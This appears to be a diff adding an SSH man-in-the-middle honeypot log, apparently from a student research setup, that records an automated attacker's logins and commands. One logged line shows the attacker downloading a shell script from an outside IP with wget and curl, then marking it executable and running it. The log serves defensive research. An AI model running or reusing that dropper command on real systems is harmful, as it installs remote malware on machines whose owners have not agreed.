@@ -1,0 +1,90 @@
+
+(node:2230609) Warning: Accessing non-existent property 'padLevels' of module exports inside circular dependency
+(Use `node --trace-warnings ...` to show where the warning was created)
+Started with the following options:
+{
+  debug: true,
+  mitmIp: '10.0.3.1',
+  autoAccess: true,
+  autoAccessCache: 5000,
+  maxAttemptsPerConnection: 6,
+  sshServerIdentifier: 'SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2',
+  containerMountPathPrefix: '/var/lib/lxc',
+  containerMountPathSuffix: 'rootfs/',
+  loggingAttackerStreams: '/home/student/MITM/logs/session_streams',
+  loggingAuthenticationAttempts: '/home/student/MITM/logs/authentication_attempts',
+  loggingLogins: '/home/student/MITM/logs/logins',
+  loggingKeystrokes: '/home/student/MITM/logs/keystrokes',
+  containerName: 'DATABASE_3',
+  containerIp: '10.0.3.124',
+  mitmPort: 1002,
+  autoAccessFixed: 1
+}
+2022-10-22 19:28:46.025 - [Info] MITM Version: 2
+2022-10-22 19:28:46.027 - [Info] Auto Access Enabled: true
+2022-10-22 19:28:46.027 - [Debug] [Init] Auto Access Theshold Achieved: false
+2022-10-22 19:28:46.034 - [Info] SSH man-in-the-middle server for 10.0.3.124 listening on 10.0.3.1:1002
+2022-10-22 19:30:39.625 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:39.627 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:39.627 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:39.628 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:39.633 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:39.633 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:40.865 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:40.865 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:40.866 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:40.866 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:40.868 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:42.031 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'none'
+2022-10-22 19:30:42.032 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 19:30:42.369 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'password'
+2022-10-22 19:30:42.370 - [Debug] [Auto Access] Attacker: 35.233.161.149, Threshold: 1, Attempts: 1
+2022-10-22 19:30:42.370 - [Debug] [Auto Access] Compromising the honeypot
+2022-10-22 19:30:42.371 - [Debug] [Auto Access] Adding the following credentials: 'root:toor'
+2022-10-22 19:30:42.450 - [Debug] [Auto Access] Auto-access is now disabled for the remainder of this MITM server instance
+2022-10-22 19:30:42.452 - [Debug] [Auth] Valid credentials - Password Authentication
+2022-10-22 19:30:42.452 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.124
+2022-10-22 19:30:42.456 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:42.456 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:42.457 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:42.458 - [Debug] [Connection] Attacker connected: 35.233.161.149 | Client Identification: SSH-2.0-Go
+2022-10-22 19:30:42.503 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2022-10-22 19:30:44.103 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'none'
+2022-10-22 19:30:44.104 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 19:30:44.104 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'none'
+2022-10-22 19:30:44.104 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 19:30:44.127 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'none'
+2022-10-22 19:30:44.127 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 19:30:45.042 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'none'
+2022-10-22 19:30:45.042 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 19:30:45.043 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'none'
+2022-10-22 19:30:45.043 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 19:30:45.046 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'none'
+2022-10-22 19:30:45.046 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 19:30:45.053 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'none'
+2022-10-22 19:30:45.053 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 19:30:45.145 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp; rm -rf wget*; wget http://179.43.175.5/wget.sh; curl -O http://179.43.175.5/wget.sh; chmod 777 wget.sh; ./wget.sh server; sh wget.sh server
+2022-10-22 19:30:45.277 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'password'
+2022-10-22 19:30:45.278 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2022-10-22 19:30:45.278 - [Debug] [Auth] Attacker: 35.233.161.149 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 19:30:45.279 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'password'
+2022-10-22 19:30:45.279 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2022-10-22 19:30:45.279 - [Debug] [Auth] Attacker: 35.233.161.149 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 19:30:45.317 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'password'
+2022-10-22 19:30:45.317 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2022-10-22 19:30:45.318 - [Debug] [Auth] Attacker: 35.233.161.149 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 19:30:47.518 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'password'
+2022-10-22 19:30:47.518 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2022-10-22 19:30:47.518 - [Debug] [Auth] Attacker: 35.233.161.149 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 19:30:47.534 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'password'
+2022-10-22 19:30:47.534 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2022-10-22 19:30:47.535 - [Debug] [Auth] Attacker: 35.233.161.149 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 19:30:47.535 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'password'
+2022-10-22 19:30:47.535 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2022-10-22 19:30:47.536 - [Debug] [Auth] Attacker: 35.233.161.149 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 19:30:47.536 - [Debug] [Auth] Attacker 35.233.161.149 trying to authenticate with 'password'
+2022-10-22 19:30:47.536 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2022-10-22 19:30:47.536 - [Debug] [Auth] Attacker: 35.233.161.149 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 19:30:48.284 - [Debug] [Connection] Attacker closed the connection
+2022-10-22 19:30:48.286 - [Debug] [Connection] Attacker closed the connection
+2022-10-22 19:30:48.331 - [Debug] [Connection] Attacker closed the connection
